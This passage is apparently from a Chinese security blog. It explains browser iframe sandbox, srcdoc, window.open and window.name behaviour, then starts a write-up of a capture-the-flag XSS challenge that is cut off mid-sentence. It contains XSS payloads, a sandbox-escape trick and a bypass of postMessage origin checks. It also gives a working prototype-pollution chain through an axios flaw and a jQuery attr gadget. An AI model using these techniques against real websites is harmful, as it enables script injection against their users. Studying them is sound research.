&quot;null&quot;，就跟原本的頁面不同源，沒辦法存取到頁面上的資料。 那這時身為防禦的一方，我們可以怎麼做呢？我們可以限制開頭一定要是 http:// 或是 https://，就可以阻擋這種預期之外的 scheme。 不過，如果只有這樣的話，還有另一個潛在的風險，那就是 open redirect，被嵌入的頁面可以用 top.location = &quot;https://huli.tw&quot;，把最上層的頁面導到任意地方。 通常跨 origin 的操作都會被禁止，要存取 window 上的屬性時也會噴錯誤出來： Uncaught DOMException: Blocked a frame with origin “null” from accessing a cross-origin frame. 但有幾個屬性除外，可參考 HTML spec 中的 7.2.3.1 CrossOriginProperties ( O )： If O is a Location object, then return « { [[Property]]: “href”, [[NeedsGet]]: false, [[NeedsSet]]: true }, { [[Property]]: “replace” } ». A JavaScript property name P is a cross-origin accessible window property name if it is “window”, “self”, “location”, “close”, “closed”, “focus”, “blur”, “frames”, “length”, “top”, “opener”, “parent”, “postMessage”, or an array index property name. 有些是可以呼叫的函式，例如說 focus、blur 跟 postMessage，這些都可以跨 origin 呼叫，而 postMessage 也是跨 origin 的 window 間傳遞資訊的首要方式。 其他大部分都是可讀的屬性，例如說 closes、frames、length 或是 top、opener 以及 parent 等等。 而少數可寫的屬性是 location.href，只要你能存取到 window，就能用 location.href = &#39;https://huli.tw&#39; 把網頁導到其他地方。 順帶一提，有另外一種執行 JavaScript 的方式就是透過 location + javascript protocol，像是這樣：location.href = &#39;javascript:alert(1)&#39;，這個我在在做跳轉功能時應該注意的問題：Open Redirect 裡有提過。 這時你可能會想說，那前面提過的 iframe src + data URI，是不是就可以透過這個方法繞過 null origin 的限制，針對 parent window 做 XSS 呢？像是這樣： &lt;iframe src=\"data:text/html,&lt;script>top.location.href = 'javascript:alert(1)'&lt;/script>\">&lt;/iframe> 答案是不行，瀏覽器會噴這樣的錯誤給你： Unsafe attempt to initiate navigation for frame with URL ‘file:&#x2F;&#x2F;poc.html’ from frame with URL ‘data:text&#x2F;html,&lt;script&gt;top.location.href &#x3D; ‘javascript:alert(1)’‘. The frame attempting navigation must be same-origin with the target if navigating to a javascript: url 如果你要跳到 javascript: 開頭的 url，那必須要 same-origin 才會讓你跳。 iframe 的 srcdoc除了常用的 src 屬性以外，還有另一個屬性叫做 srcdoc，裡面放的值就是 iframe 的內容，跟 src + data URI 其實有點類似： &lt;iframe srcdoc=\"&lt;h1>hello&lt;/h1>&lt;script>alert(top.document.body)&lt;/script>\"> &lt;/iframe> 但是有個決定性的差異，那就是 iframe + srcdoc 所產生的 window，它的 origin 會繼承上層，跟 data URI 會變成 null origin 不同。也就是說，上面這段程式碼可以存取到上層的 DOM 元素，因為他們是 same origin。 另外，srcdoc 並不受 CSP 的 frame-src 影響，就像 iframe 的 src 如果是 javascript: 的話，是受 script-src 管而不是 frame-src 管，細節可看這裡：Test of CSP: iframe srcdoc&#x3D;’…’ is not governed by frame-src 還有，由於 srcdoc 是 HTML attribute 的關係，所以內容就跟之前提過的一樣，可以是 encode 過的結果，像這樣： &lt;iframe srcdoc=\"&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;\">&lt;/iframe> 所以如果 iframe srcdoc 的屬性可控，就算內容有先 escape 過也沒有用，還是會被解析回原本的符號來執行。 iframe 的 CSPiframe 上有一個 csp 的屬性，可以指定 iframe 所載入的 document 的 CSP 規則，不過並不是每個瀏覽器都支援，可參考 MDN: HTMLIFrameElement.csp： &lt;iframe csp=\"default-src 'self'; script-src 'none';\" srcdoc=\"&lt;script>alert(1)&lt;/script>\">&lt;/iframe> 加了 csp 屬性後，iframe 的內容會被它所影響，舉例來說，直接打開 test.html 會跳 alert，但是用 csp 把 inline script 擋住，就會跳出違反 CSP 的錯誤訊息： // test.html &lt;script>alert(1)&lt;/script> // csp.html &lt;iframe csp=\"default-src 'self'; script-src 'none';\" src=\"test.html\">&lt;/iframe> Refused to execute inline script because it violates the following Content Security Policy directive: “script-src ‘none’”. Either the ‘unsafe-inline’ keyword, a hash (‘sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI&#x3D;’), or a nonce (‘nonce-…’) is required to enable inline execution. 之前 Intigriti 有一次的 XSS 挑戰就是利用插入 CSP 的方式把 CSP 變嚴格，然後有些腳本就不會執行到，靠這樣來繞過一些限制。 iframe 的 sandbox前面有提過，當你利用 iframe 把其他網頁嵌入的時候，那個網頁可以用 top.location = &#39;https://huli.tw&#39; 把上層頁面導到其他地方，而 iframe 有個叫做 sandbox 的屬性，可以限制 iframe 的各種行為，讓它不能做一些壞壞的事，基本的使用像是這樣： &lt;iframe srcdoc=\"&lt;script>alert(1)&lt;/script>\" sandbox>&lt;/iframe> Blocked script execution in ‘about:srcdoc’ because the document’s frame is sandboxed and the ‘allow-scripts’ permission is not set. 一旦加上了 sandbox 這個屬性，就進入了沙箱模式，這個模式有沒有加主要的差別有兩個。 第一個是，被載入的 iframe 的 origin 會變成 null。 第二個是，一堆功能會被關閉，而這些功能可以被主動開啟，根據目前最新的 spec 所述，一共有 13 種 flag，每一個都代表一個功能： allow-downloads allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation allow-top-navigation-by-user-activation allow-top-navigation-to-custom-protocols 這邊其實 flag 有點多而且有些只差一點點，我們先來看最重要的一個，就是 allow-scripts，這個 flag 十分好懂，沒有加上的話，預設是沒辦法執行 JavaScript 的，就像上面看到的錯誤那樣，加上這個 flag 以後才能執行 JavaScript，但可以使用的功能還是有限制。 其他的 flag 我們可以分成幾類來看比較好懂。 重新導向類型的 flag底下這三個都跟重新導向有關 allow-top-navigation allow-top-navigation-by-user-activation allow-top-navigation-to-custom-protocols 如果沒有加的話，預設是不能對上層重新導向的： &lt;iframe srcdoc=\"&lt;script>top.location='https://blog.huli.tw'&lt;/script>\" sandbox=\"allow-scripts\"> &lt;/iframe> 錯誤： Unsafe attempt to initiate navigation for frame with URL ‘file:&#x2F;&#x2F;&#x2F;test.html’ from frame with URL ‘about:srcdoc’. The frame attempting navigation of the top-level window is sandboxed, but the flag of ‘allow-top-navigation’ or ‘allow-top-navigation-by-user-activation’ is not set. 想要讓 iframe 可以對上層重新導向，只要加上 allow-top-navigation 即可，但如果你不想讓網頁在沒有互動的狀況下就自動重新導走，可以改用 allow-top-navigation-by-user-activation 這個 flag： &lt;iframe srcdoc=\"&lt;script>top.location='https://blog.huli.tw'&lt;/script>\" sandbox=\"allow-scripts allow-top-navigation-by-user-activation\"> &lt;/iframe> 錯誤： The frame attempting navigation of the top-level window is sandboxed with the ‘allow-top-navigation-by-user-activation’ flag, but has no user activation (aka gesture). See https://www.chromestatus.com/feature/5629582019395584. 用這個 flag 的話，使用者必須要有互動（例如說點個按鈕來觸發事件），才能把網頁重新導走。 而 allow-top-navigation-to-custom-protocols 這個 flag 因為 Chrome 目前還沒支援，所以也沒辦法 demo，就先跳過吧。Chrome 102 支援的 flag 可以看這邊：third_party&#x2F;blink&#x2F;renderer&#x2F;core&#x2F;html&#x2F;html_iframe_element_sandbox.cc 功能類型的 flag allow-downloads allow-forms allow-orientation-lock allow-pointer-lock allow-presentation 上面這五個都是跟功能有關的，從名字就大概可以看出來是在幹嘛。 舉例來說，預設是不能送出表單的： &lt;iframe srcdoc=\"&lt;form>&lt;input name=a value=a>&lt;input type=submit>&lt;/form>\" sandbox> &lt;/iframe> 錯誤： Blocked form submission to ‘’ because the form’s frame is sandboxed and the ‘allow-forms’ permission is not set. 要加上 allow-forms 這個 flag 之後才能送出表單。其他的 flag 也都類似，這邊就不多說了。 彈出視窗相關的 flag allow-modals allow-popups allow-popups-to-escape-sandbox 這邊 allow-modals 跟 allow-popups 名字很像，但定義其實差滿多的，底下幾種功能都是 allow-modals 會開啟的： window.alert window.confirm window.print window.prompt beforeunload event 給個簡單的範例：&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot; sandbox=&quot;allow-scripts&quot;&gt;，錯誤： Ignored call to ‘alert()’. The document is sandboxed, and the ‘allow-modals’ keyword is not set. 而 allow-popups 則是與 window.open 跟 target=_blank 這些東西有關，預設情況下你是沒辦法開新視窗的： &lt;iframe srcdoc=\"&lt;script>window.open()&lt;/script>\" sandbox=\"allow-scripts\"> &lt;/iframe> 錯誤： Blocked opening ‘’ in a new window because the request was made in a sandboxed frame whose ‘allow-popups’ permission is not set. 要把 allow-popups 加上去之後才能使用 window.open。 而這邊還有一個神奇的特性，我覺得舊版 spec 寫得比較清楚： While the sandbox attribute is specified, the iframe element’s nested browsing context must have the flags given in the following list set. In addition, any browsing contexts nested within an iframe, either directly or indirectly, must have all the flags set on them as were set on the iframe’s Document’s browsing context when the iframe’s Document was created. 新版 spec 則直接把那段拿掉，要去另一個地方找，不過大意是一樣的，就是 sandbox iframe 裡面所開啟的 window，會繼承 sandbox 的屬性！ 這是什麼意思呢？ 舉例來說，如果我有一個 iframe.html，內容只有這樣：&lt;script&gt;alert(1)&lt;/script&gt;，接著我在另一個頁面 test.html 這樣寫： &lt;iframe srcdoc=\"&lt;script>window.open('iframe.html')&lt;/script>\" sandbox=\"allow-scripts allow-popups\"> &lt;/iframe> 你會發現新開啟的 iframe.html 這個頁面沒辦法執行 alert(1)，因為它繼承了 sandbox，而 sandbox 並沒有加上 allow-modals 這個屬性。 再舉個例子，我們可以在網路上隨便找一個用 JS 來 render 頁面內容的網頁，像這個計算機：https://ahfarmer.github.io/calculator/ 直接打開是沒問題的，但如果我們用一個 sandbox iframe 打開的話： &lt;iframe srcdoc=\"&lt;a href='https://ahfarmer.github.io/calculator/' target=_blank>click me&lt;/a>\" sandbox=\"allow-popups\"> &lt;/iframe> 你會看到畫面變成一片黑，打開 DevTools 可以看到錯誤： Blocked script execution in ‘https://ahfarmer.github.io/calculator/‘ because the document’s frame is sandboxed and the ‘allow-scripts’ permission is not set. 再次驗證了我們上面所說的，從 sandbox iframe 中開啟的 window 會繼承 sandbox 屬性。除此之外，還有一個特性，那就是你還記得 sandbox 裡的 origin 會變成 null 嗎？因為會繼承的緣故，所以使用 window.open 打開的頁面，origin 也會變成 null。 這代表著什麼？代表著我們可以用 sandbox iframe + window.open 達成： 關閉任意頁面的某些功能 讓任意頁面的 origin 變成 null 前面有提過兩個不同的 window 可以透過 postMessage 來交換訊息，而在監聽訊息時都會檢查 event.origin，確認是否合法： window.onmessage = function(event) &#123; if (event.origin !== 'https://example.com') return &#125; 但也有些網頁會這樣檢查： window.onmessage = function(event) &#123; if (event.origin !== window.origin) return &#125; 這時候我們就可以利用上面提到的技巧繞過檢查，用 sandbox iframe 開啟頁面，就可以讓它的 origin 變成 &quot;null&quot;，然後我們再從 sandbox iframe 本身的 window 去 postMessage，就可以讓 event.origin 也是 &quot;null&quot;，藉此讓條件成立。不過雖然這樣做可以繞過檢查，但就算後續拿到了 XSS，可以做的事情依然有限，因為 origin 是 &quot;null&quot; 了，所以 localStorage 跟 cookie 之類的都無法存取。 有一個 soXSS challenge 就是用這一招去解。 如果不想讓新開的視窗繼承 sandbox 屬性的話，可以加上 allow-popups-to-escape-sandbox，這樣一來，新開的視窗就會跳出 sandbox： &lt;iframe srcdoc=\"&lt;a href='https://ahfarmer.github.io/calculator/' target=_blank>click me&lt;/a>\" sandbox=\"allow-popups allow-popups-to-escape-sandbox\"> &lt;/iframe> 以前曾經發生過一個問題，就是既然 allow-popups-to-escape-sandbox 可以跳離 sandbox，那就可以結合 javascript: 去執行程式碼，像是這樣： &lt;iframe sandbox=\"allow-modals allow-popups allow-popups-to-escape-sandbox\" srcdoc=\"&lt;a target='_blank' href='javascript:window.opener.eval(`alert(location.href)`)'>click me&lt;/a>\"> &lt;/iframe> 細節可參考： Issue 1014371: Security: iframe sandbox can be worked around via javascript: links and window.opener 以及 Gate javascript: navigation on sandboxing flags. #5083 還有當初的 commit。 最後順便提一下另一個跟 window.origin 類似的東西：location.origin，這個就是純粹根據 location 來決定 origin，跟 window.origin 不太一樣。根據規格中的說法： Developers are strongly encouraged to use self.origin over location.origin. The former returns the origin of the environment, the latter of the URL of the environment. Imagine the following script executing in a document on https://stargate.example/: 接著底下舉了個例子說明 window.origin 比 location.origin 更可靠： var frame = document.createElement(\"iframe\") frame.onload = function() &#123; var frameWin = frame.contentWindow console.log(frameWin.location.origin) // \"null\" console.log(frameWin.origin) // \"https://stargate.example\" &#125; document.body.appendChild(frame) 不過我覺得似乎還是要看場合就是了。 allow-same-origin終於來到了最後一個 sandbox 的 flag，前面有提到一旦加上了 sandbox，origin 就會變成 &quot;null&quot;，就算可以執行 JavaScript，也無法拿到 cookie 或是 localStorage，其實非常受限。 如果要突破這個限制，就必須加上 allow-same-origin。我以前對這個 flag 感到很困惑，想說：「難道加上了這個 flag，iframe 跟 parent window 就會變成 same origin 嗎？」，但根據我的理解，這個 flag 其實比較像是：「保留原本的 origin」的意思，底下直接引用一段規格上的精確描述： The allow-same-origin keyword causes the content to be treated as being from its real origin instead of forcing it into a unique origin 以底下這一段為例，假設這個頁面的網址是：http://localhost:3000 &lt;iframe sandbox=\"allow-same-origin allow-scripts allow-modals\" srcdoc=\"&lt;script>alert(window.origin)&lt;/script>\">&lt;/iframe> 如果沒有加上 allow-same-origin 的話，會跳出 &quot;null&quot;，但如果加上了 allow-same-origin，就會正常跳出 http://localhost:3000，保留原本的 origin。 另外，規格上也有特別提醒，如果你在 iframe 內嵌入一個 same origin 的網頁，然後 sandbox 設置了 allow-same-origin allow-scripts，那 iframe 內的網頁就可以自己把 sandbox 給移掉，變成有加跟沒加一樣，像是這樣： &lt;iframe sandbox=\"allow-same-origin allow-scripts\" srcdoc=\"&lt;script>top.document.querySelector('iframe').removeAttribute('sandbox');location.reload();alert(1)&lt;/script>\"> &lt;/iframe> iframe 總結我相信對大部分開發者來說，以下幾個屬性應該還是挺陌生的： srcdoc csp sandbox 有用過或是處理過相關需求可能才會知道這些東西，而對 CTF 來說，有幾個特性是我曾經看過或是可能可以被利用的： src 裡放上 javascript: 直接 XSS 幫嵌入的頁面加上 csp 以阻擋部分功能執行 利用 srcdoc 是個屬性的特性放入已經被 escaped 的字串，此時會被還原成原本內容 利用 sandbox + window.open 的繼承特性，達成「就算不能用 iframe 嵌入內容，也可以改變 window.origin」 window.open講完 iframe 以後，我們繼續來看 window.open 這個方法，它有三個參數，都是可選的：window.open(url, name, features)，然後它會回傳所開啟的 window，你就可以對這個新的 window postMessage 之類的： var win = window.open('https://blog.huli.tw', 'huliblog') // 要先等 window 載入好 setTimeout(() => &#123; win.postMessage(\"hello\", '*') &#125;, 2000) 新開的 window 可以用 window.opener 存取到開啟它的 window，這個功能我之前在從 SessionStorage 開始一場 spec 之旅中有提到過。 然後，window.open 傳入的第二個參數就會是這個新的 window 的 name，舉例來說，如果我在新開的 window 執行 console.log(window.name)，就會印出 huliblog。 這個 window.name 其實是個很好玩的特性，通常在新開連結時，我們不是會這樣嗎：&lt;a href=&quot;https://example.com&quot; target=&quot;_blank&quot;&gt;open&lt;/a&gt;，用 target=_blank 的方式去開新視窗，但其實這個 target 也可以放一個字串，而這個字串就會是新開的視窗的名稱，像這樣： &lt;a href=\"https://example.com\" target=\"example\"> open &lt;/a> 你在這個新開的視窗打開 console 然後 log 一下 window.name，就會看到我們設定的 example。 那如果這個 named window 已經存在了呢？我們來試試看： &lt;a href=\"https://blog.huli.tw\" target=\"blog\">open link&lt;/a> &lt;button onclick=\"window.open('https://example.org/','blog')\">open window&lt;/button> 按下 &lt;a&gt; 會新開一個叫做 blog 的 window，並且導到我的部落格，按下按鈕則是會新開一個連去別的網頁的視窗，name 也是 blog。你可以試試看先按連結，再按按鈕，也可以試試看反過來操作。 總之，結果都是類似的，在新開 window 時會先確認是不是有同名的 window 存在，如果有的話，就不會新開一個，而是會直接沿用那個。所以上面的範例中，如果先按了按鈕開了一個 blog 的 window，然後再按下連結的話，並不會新開視窗，只會在原本那個 window 重新導向到 href 中的網址。 除了 a 的 target 以外，form 的 target 也可以指定 window 名稱，規格上的術語叫做：「Valid browsing context name or keyword」，keyword 就是大家所熟知的那四個：_blank, _self, _parent, or _top。 根據規格 7.1.5 Browsing context names，只要不要是 _ 開頭都是合法的名稱： A valid browsing context name is any string with at least one character that does not start with a U+005F LOW LINE character. (Names starting with an underscore are reserved for special keywords.) 產生 named window 以及獲取 window reference想要產生 named window 的話有幾種方式： &lt;a target=&quot;&quot;&gt; &lt;form target=&quot;&quot;&gt; &lt;iframe name=&quot;&quot;&gt; &lt;object name=&quot;&quot;&gt; &lt;embed name=&quot;&quot;&gt; window.open(url, name) 後四種你都可以直接拿到開啟的 window 的 reference，像是這樣： &lt;iframe name=\"w1\" src=\"https://blog.huli.tw\">&lt;/iframe> &lt;object name=\"w2\" data=\"https://blog.huli.tw\">&lt;/object> &lt;embed name=\"w3\" src=\"https://blog.huli.tw\">&lt;/embed> &lt;script> var w4 = window.open('https://blog.huli.tw') setTimeout(() => &#123; console.log('w1', w1) console.log('w2', w2) console.log('w3', w3) console.log('w4', w4) &#125;, 2000) &lt;/script> 那前兩種怎麼辦呢？可以利用 window.open 時如果 name 已經存在的特性來拿到，像這樣： &lt;a target=\"blog\" href=\"https://blog.huli.tw\">open&lt;/a> &lt;button onclick=\"run()\">get blog window&lt;/button> &lt;script> function run() &#123; var blog = window.open('https://blog.huli.tw#abc', 'blog') console.log(blog) &#125; &lt;/script> 先點 open 新開視窗，然後再按下按鈕，此時我們用 window.open(&#39;https://blog.huli.tw#abc&#39;, &#39;blog&#39;) 的方式，打開一個同名的視窗，這時根據規格上的說法： Opens a window to show url (defaults to “about:blank”), and returns it. target (defaults to “_blank”) gives the name of the new window. If a window already exists with that name, it is reused. 因為有同名的 window 存在所以會 reuse，然後我們又只是加上 # 而已所以不會重新導向，此時雖然 focus 會跳去新開的 window，但是靠這樣的做法就能夠拿到用 &lt;a target&gt; 所開啟的視窗的 reference（還有另外一種方式也不會跳轉，就是給一個不存在的 scheme，像是 xxxx://test 之類的）。 另外，這個 named window 應該是在同一個 browsing context 底下才有用，換句話說，假如我開啟了兩個網頁 A.html 跟 B.html，在 A.html 裡面開了一個叫做 blog 的 window，然後在 B.html 執行 window.open(&#39;&#39;, &#39;blog&#39;)，此時並不會拿到 A.html 開的 blog window，而是會自己新開一個，因為 A 跟 B 處於不同的 browsing context。 但是換頁的狀況就不一樣了，這個滿好玩的，假設我現在在 http://localhost:5555/A.html，然後開了一個叫做 blog 的 window，開完之後導到 http://localhost:5555/B.html： &lt;button onclick=\"run()\">run&lt;/button> &lt;script> function run() &#123; window.open('https://blog.huli.tw', 'blog') location = 'http://localhost:5555/B.html' &#125; &lt;/script> 接著我在 B.html 裡面也開一個同名的 window：window.open(&#39;&#39;, &#39;blog&#39;)，此時就會拿到剛剛 A.html 開啟的 blog window，而不是新開一個。另外，如果我從 B.html 重新導向去 https://blog.huli.tw，接著在 console 執行 window.open(&#39;&#39;, &#39;blog&#39;)，一樣也可以拿到剛剛 A.html 開啟的 blog window。 但如果我重新導向到 https://example.org，就會新開分頁，拿不到 blog window。 看起來如果同一個分頁底下跳轉到了跟 opener 或是跟開啟的 window same origin 的網頁，似乎就會是同個 browsing context，這個特性滿有趣的（該找時間研究一下 browsing context 了）。 window.name 的利用有時候 XSS 會受長度限制，例如說 username 有 XSS 漏洞，但是只有 32 個字可以用之類的，這時候我們就會希望我們的 payload 越短越好。如果想要越短越好，自然就會需要利用其他資訊來帶入真正想執行的程式碼，才能控制長度。 舉例來說，你可以把想執行的程式碼放在網址的 # 後面，然後 payload 寫 eval(location.hash.slice(1)) 之類的。 而 window.name 就是一個很常被利用的東西，我們可以先在 A 網頁設置 window.name 以後跳轉到 B 網頁，此時 B 網頁的 window.name 就會是我們剛剛所設定好的： name = 'hello, world!' location = 'https://example.org' 不過這招只有在 Chromium based 的瀏覽器（Chrome 跟 Edge）上有效而已，因為根據規格的說法，如果跳轉的頁面不是 same origin 的話，name 應該要被清掉才對。 Chromium 有一個 bug 就是關於這個：Issue 706350: Clear browsing context name on cross site navigation or history traversal，從 2017 年開到現在還沒修好，中間一度有修過但引起其他 bug，就 revert 回來了。 Safari 是第一個實作的，而 2021 年 1 月時 FireFox 也實作了，於是 Chromium 就變成異類了，裡面還有附上這個很讚的網頁，可以看每個瀏覽器的測試狀況：https://wpt.fyi/results/html/browsers/windows/clear-window-name.https.html?label=master&amp;label=experimental&amp;aligned 偵測新開 window 的載入完成iframe 有 onload 事件，可以透過這個事件得知是否載入完成。可是用 window.open 打開後的視窗，並沒有這個事件可以監聽（除非是 same origin），所以你不知道它什麼時候會載入完成。 但沒關係，如果你打開的是一個 cross origin 的網頁，你可以利用存取 window.origin 或其他屬性會出錯的特性來實做一個簡單的輪詢： var start = new Date() var win = window.open('https://blog.huli.tw') run() function run() &#123; try &#123; win.origin setTimeout(run, 60) &#125; catch(err) &#123; console.log('loaded', (new Date() - start), 'ms') &#125; &#125; 在網頁還沒載入好的時候，win.origin 會是自己，載入好才會變成開啟的網頁，因此載入完成後存取 win.origin 會因為 cross origin 出事，被 catch 捕捉到。 偵測某個 name 的 window 是否存在我們有沒有辦法偵測某個 name 的 window 是否存在呢？ 前面我們有提到如果新開一個 named window 時已經有同名的 window 存在，就不會新開一個，而是會跳轉，我們可以利用這點的差異來做偵測，還可以搭配前面提過的 iframe sandbox，用這個特性阻止開新視窗。 以上概念來自 Easter XSS by @terjanq，程式碼有稍微修改一下，只針對 Chrome： &lt;body> &lt;a href=\"https://blog.huli.tw\" target=\"blog\">click&lt;/a> &lt;button onclick=\"run()\">run&lt;/button> &lt;iframe name=f sandbox=\"allow-scripts allow-same-origin allow-popups-to-escape-sandbox allow-top-navigation\"> &lt;/iframe> &lt;script> function run()&#123; var w = f.open('xxx://abcde', 'blog') if (w) &#123; console.log('blog window exists') &#125; else &#123; console.log('blog window not exists') &#125; &#125; &lt;/script> &lt;/body> 總結這篇簡單記錄了一些 iframe 跟 window 的有趣特性，不過有些東西還是沒有研究透徹，例如說 browsing context 的相關名詞還有怎樣算在同一個 browsing context 底下之類的，這些就要看 spec 慢慢吸收了。 參考資料： https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox https://cloud.google.com/blog/products/data-analytics/iframe-sandbox-tutorial https://www.w3.org/TR/2010/WD-html5-20100624/the-iframe-element.html https://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/ https://googlechrome.github.io/samples/allow-popups-to-escape-sandbox/ https://xsleaks.dev/","link":"/2022/04/07/iframe-and-window-open/"},{"title":"Intigriti 0124 XSS 筆記","text":"上個月（2024 年 1 月）的 Intigriti 挑戰非常有趣，出題者是 @kevin_mizu，之前也常在推特上看到他出一些 client-side 相關的題目，而這次的題目品質也一如既往的很好，值得寫一篇紀錄。 題目的連結在這邊，沒有看過的話可以先去看看：https://challenge-0124.intigriti.io/ 似乎比想像中簡單？題目的程式碼滿簡短的，先來看前端的部分，基本上就是一個 HTML 而已： &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;title>Intigriti XSS Challenge&lt;/title> &lt;link rel=\"stylesheet\" href=\"/static/css/main.css\"> &lt;/head> &lt;body> &lt;h2>Hey &lt;%- name %>,&lt;br>Which repo are you looking for?&lt;/h2> &lt;form id=\"search\"> &lt;input name=\"q\" value=\"&lt;%= search %>\"> &lt;/form> &lt;hr> &lt;img src=\"/static/img/loading.gif\" class=\"loading\" width=\"50px\" hidden>&lt;br> &lt;img class=\"avatar\" width=\"35%\"> &lt;p id=\"description\">&lt;/p> &lt;iframe id=\"homepage\" hidden>&lt;/iframe> &lt;script src=\"/static/js/axios.min.js\">&lt;/script> &lt;script src=\"/static/js/jquery-3.7.1.min.js\">&lt;/script> &lt;script> function search(name) &#123; $(\"img.loading\").attr(\"hidden\", false); axios.post(\"/search\", $(\"#search\").get(0), &#123; \"headers\": &#123; \"Content-Type\": \"application/json\" &#125; &#125;).then((d) => &#123; $(\"img.loading\").attr(\"hidden\", true); const repo = d.data; if (!repo.owner) &#123; alert(\"Not found!\"); return; &#125;; $(\"img.avatar\").attr(\"src\", repo.owner.avatar_url); $(\"#description\").text(repo.description); if (repo.homepage &amp;&amp; repo.homepage.startsWith(\"https://\")) &#123; $(\"#homepage\").attr(&#123; \"src\": repo.homepage, \"hidden\": false &#125;); &#125;; &#125;); &#125;; window.onload = () => &#123; const params = new URLSearchParams(location.search); if (params.get(\"search\")) search(); $(\"#search\").submit((e) => &#123; e.preventDefault(); search(); &#125;); &#125;; &lt;/script> &lt;/body> &lt;/html> 其中這一段 &lt;h2&gt;Hey &lt;%- name %&gt; 是與後端唯一有關的部分，會在後端使用 DOMPurify 來進行 sanitization： app.get(\"/\", (req, res) => &#123; if (!req.query.name) &#123; res.render(\"index\"); return; &#125; res.render(\"search\", &#123; name: DOMPurify.sanitize(req.query.name, &#123; SANITIZE_DOM: false &#125;), search: req.query.search &#125;); &#125;); 值得注意的是這邊的 SANITIZE_DOM: false，這個設置會停止對於 DOM Clobbering 的防護，因此可以猜測這題與 DOM Clobbering 有關，才會刻意把這個設置關掉。 而整題最主要的邏輯都在 search 函式裡面了： function search(name) &#123; $(\"img.loading\").attr(\"hidden\", false); axios.post(\"/search\", $(\"#search\").get(0), &#123; \"headers\": &#123; \"Content-Type\": \"application/json\" &#125; &#125;).then((d) => &#123; $(\"img.loading\").attr(\"hidden\", true); const repo = d.data; if (!repo.owner) &#123; alert(\"Not found!\"); return; &#125;; $(\"img.avatar\").attr(\"src\", repo.owner.avatar_url); $(\"#description\").text(repo.description); if (repo.homepage &amp;&amp; repo.homepage.startsWith(\"https://\")) &#123; $(\"#homepage\").attr(&#123; \"src\": repo.homepage, \"hidden\": false &#125;); &#125;; &#125;); &#125;; 其實上面這一段，並沒有看出什麼有漏洞的地方，因此看完這段之後，我就先往用到的 library 去找，這題用到的是 jQuery 3.7.1 以及 axios 1.6.2，雖然檔案名稱沒寫，但是從檔案內容可以看得出來。 查了一下可以發現 1.6.2 並非最新版本，而且在 1.6.4 中修復了一個 prototype pollution 的漏洞：https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e commit 裡面更是直接附上了 exploit，非常貼心： it('should resist prototype pollution CVE', () => &#123; const formData = new FormData(); formData.append('foo[0]', '1'); formData.append('foo[1]', '2'); formData.append('__proto__.x', 'hack'); formData.append('constructor.prototype.y', 'value'); expect(formDataToJSON(formData)).toEqual(&#123; foo: ['1', '2'], constructor: &#123; prototype: &#123; y: 'value' &#125; &#125; &#125;); expect(&#123;&#125;.x).toEqual(undefined); expect(&#123;&#125;.y).toEqual(undefined); &#125;); 從 commit 可以看出 axios 中有一個叫做 formDataToJSON 的函式，會把 FormData 轉為 JSON，而轉換的程式碼中存有漏洞，可以透過 name 進行 prototype pollution。 接著再回來看題目的程式碼，有一段是：axios.post(&quot;/search&quot;, $(&quot;#search&quot;).get(0)，因此只要能掌握 #search，就能掌握這邊傳入的參數，從 axios 的原始碼中可以看出這邊傳入的 form，最後會被取出 FormData，並且傳給 formDataToJSON（這邊引用的部分程式碼看不出來，但只要 trace 一下之後不難發現這件事）。 因此，我們可以用 name 注入一個 &lt;form&gt; 來進行 prototype pollution，下一步就要尋找 gadget 了，通常在找 gadget 的時候，會先從物件下手。 而程式碼中有個部分非常可疑： $(\"#homepage\").attr(&#123; \"src\": repo.homepage, \"hidden\": false &#125;); 這裡傳入的參數是個物件，如果 .attr 函式沒有特別做檢查，很有可能會被污染的參數影響，而事實上也是這樣，在 jQuery 中，attr 的實作如下： jQuery.fn.extend( &#123; attr: function( name, value ) &#123; return access( this, jQuery.attr, name, value, arguments.length > 1 ); &#125;, &#125; access 的部分實作： export function access( elems, fn, key, value, chainable, emptyGet, raw ) &#123; var i = 0, len = elems.length, bulk = key == null; // Sets many values if ( toType( key ) === \"object\" ) &#123; chainable = true; for ( i in key ) &#123; access( elems, fn, i, key[ i ], true, emptyGet, raw ); &#125; &#125; &#125; 如果傳入的 key 是個 object，會用 in 來取出每一個 key 設定。由於 in 會取出原型鏈上的屬性，因此可以透過污染 onload，讓 jQuery 去設定 onload 屬性。 payload 如下： &lt;form id=search> &lt;input name=__proto__.onload value=alert(document.domain)> &lt;input name=q value=react-d3>&lt; &lt;/form> 看起來沒什麼問題，但嘗試過後，會發現出現了錯誤： Uncaught (in promise) TypeError: Cannot use &#39;in&#39; operator to search for &#39;set&#39; in alert(document.domain) 經過一陣 debug 之後，會發現這段錯誤是源自於設置 attr 時的這一段： // Attribute hooks are determined by the lowercase version // Grab necessary hook if one is defined if ( nType !== 1 || !jQuery.isXMLDoc( elem ) ) &#123; hooks = jQuery.attrHooks[ name.toLowerCase() ] || ( jQuery.expr.match.bool.test( name ) ? boolHook : undefined ); &#125; if ( value !== undefined ) &#123; if ( value === null ) &#123; jQuery.removeAttr( elem, name ); return; &#125; if ( hooks &amp;&amp; \"set\" in hooks &amp;&amp; ( ret = hooks.set( elem, value, name ) ) !== undefined ) &#123; return ret; &#125; elem.setAttribute( name, value + \"\" ); return value; &#125; 會先執行到 hooks = jQuery.attrHooks[ name.toLowerCase() ]，由於我們污染了 onload 屬性，所以 jQuery.attrHooks[&#39;onload&#39;] 會是字串，因此 hooks 也是個字串。 接著執行到 &quot;set&quot; in hooks，由於字串並沒有 in 可以用，因此拋出了先前看到的錯誤。 既然知道問題在哪了，那解決方式就簡單了，把 onload 改成 Onload 就好，因為如此一來 name.toLowerCase() 就會是 onload，而 jQuery.attrHooks[&#39;onload&#39;] 並不存在。 做到這裡，題目就解開了，難度比我想像中的容易很多，大約花個 3-4 個小時差不多。接著，我看到了作者的推特，意識到原來是有 